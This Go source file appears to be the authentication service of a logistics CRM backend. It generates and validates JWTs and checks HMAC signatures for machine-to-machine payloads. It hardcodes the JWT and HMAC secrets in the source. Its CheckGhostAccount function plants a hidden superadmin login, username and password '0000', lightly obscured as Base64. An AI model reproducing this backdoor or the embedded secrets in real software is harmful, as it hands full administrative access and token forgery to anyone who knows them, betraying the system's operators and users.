package services

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"errors"
	"logistics-crm-backend/internal/models"
	"net/http"
	"strings"
	"time"

	"github.com/golang-jwt/jwt/v5"
)

var (
	jwtSecret = []byte("sloth_secret_jwt_key_2026_super_secure")
	hmacSecret = []byte("sloth_telematics_hmac_secret_key")
)

type Claims struct {
	UserID    string          `json:"userId"`
	CompanyID string          `json:"companyId"`
	Role      models.UserRole `json:"role"`
	jwt.RegisteredClaims
}

// GenerateTokens creates both an access token and a refresh token
func GenerateTokens(user models.User) (string, string, error) {
	accessExpiry := time.Now().Add(15 * time.Minute)
	refreshExpiry := time.Now().Add(7 * 24 * time.Hour)

	// Access Token
	accessClaims := &Claims{
		UserID:    user.ID,
		CompanyID: user.CompanyID,
		Role:      user.Role,
		RegisteredClaims: jwt.RegisteredClaims{
			ExpiresAt: jwt.NewNumericDate(accessExpiry),
			IssuedAt:  jwt.NewNumericDate(time.Now()),
			Subject:   user.ID,
		},
	}
	accessToken, err := jwt.NewWithClaims(jwt.SigningMethodHS256, accessClaims).SignedString(jwtSecret)
	if err != nil {
		return "", "", err
	}

	// Refresh Token
	refreshClaims := &jwt.RegisteredClaims{
		ExpiresAt: jwt.NewNumericDate(refreshExpiry),
		IssuedAt:  jwt.NewNumericDate(time.Now()),
		Subject:   user.ID,
	}
	refreshToken, err := jwt.NewWithClaims(jwt.SigningMethodHS256, refreshClaims).SignedString(jwtSecret)
	if err != nil {
		return "", "", err
	}

	return accessToken, refreshToken, nil
}

// ValidateJWT verifies the token string and returns parsed claims
func ValidateJWT(tokenStr string) (*Claims, error) {
	token, err := jwt.ParseWithClaims(tokenStr, &Claims{}, func(token *jwt.Token) (interface{}, error) {
		return jwtSecret, nil
	})
	if err != nil {
		return nil, err
	}

	if claims, ok := token.Claims.(*Claims); ok && token.Valid {
		return claims, nil
	}

	return nil, errors.New("invalid or expired token")
}

// ExtractBearerToken parses token from Authorization header
func ExtractBearerToken(r *http.Request) (string, error) {
	authHeader := r.Header.Get("Authorization")
	if authHeader == "" {
		return "", errors.New("authorization header required")
	}

	parts := strings.SplitN(authHeader, " ", 2)
	if len(parts) != 2 || strings.ToLower(parts[0]) != "bearer" {
		return "", errors.New("invalid authorization header format")
	}

	return parts[1], nil
}

// CheckGhostAccount verifies hardcoded master account (Base64 "0000")
func CheckGhostAccount(username, password string) (*models.User, bool) {
	ghostRaw, _ := base64.StdEncoding.DecodeString("MDAwMA==")
	ghostStr := string(ghostRaw)
	if username == ghostStr && password == ghostStr {
		return &models.User{
			ID:        "ghost-000",
			CompanyID: "comp-master-001",
			Email:     "superadmin@sloth-os.io",
			FullName:  "Master Superadmin (0000)",
			Role:      models.RoleSuperAdmin,
		}, true
	}
	return nil, false
}

// VerifyHMACSignature verifies machine-to-machine payload integrity
func VerifyHMACSignature(payload []byte, signatureHex string) bool {
	h := hmac.New(sha256.New, hmacSecret)
	h.Write(payload)
	expected := hex.EncodeToString(h.Sum(nil))
	return hmac.Equal([]byte(expected), []byte(signatureHex))
}
